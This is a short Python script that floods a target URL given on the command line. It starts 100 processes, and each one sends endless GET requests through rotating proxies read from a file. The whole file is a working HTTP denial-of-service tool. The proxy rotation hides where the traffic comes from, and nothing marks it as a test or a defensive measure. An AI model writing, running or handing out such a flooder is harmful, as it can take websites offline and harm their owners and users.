import sys
from multiprocessing import Process
import requests

proxy = open('proxy.txt').read().splitlines()


def worker(target: str = ''):
    while True:
        for p in proxy:
            try:
                resp = requests.get(target, proxies={'http': p})
                print(resp.content)
            except Exception as error:
                print(error)


if __name__ == '__main__':
    target = sys.argv[1]
    print(target)
    procs = []
    for i in range(100):
        process = Process(target=worker, args=(target,))
        process.start()
        procs.append(process)
    for i in procs:
        i.join()
